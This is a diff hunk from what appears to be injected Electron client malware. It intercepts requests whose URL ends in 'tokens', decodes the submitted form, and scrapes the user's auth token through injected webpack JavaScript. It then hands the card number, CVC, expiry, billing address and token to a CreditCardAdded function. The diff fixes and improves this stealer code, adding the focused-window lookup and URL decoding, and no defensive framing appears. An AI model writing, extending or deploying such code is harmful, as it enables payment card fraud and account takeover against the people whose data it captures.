@@ -184,7 +184,8 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
     }
     if (details.url.endsWith("tokens")) {
 
-        const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString())
+        const window = BrowserWindow.getFocusedWindow();
+        const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
         window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
             CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token);
         }));
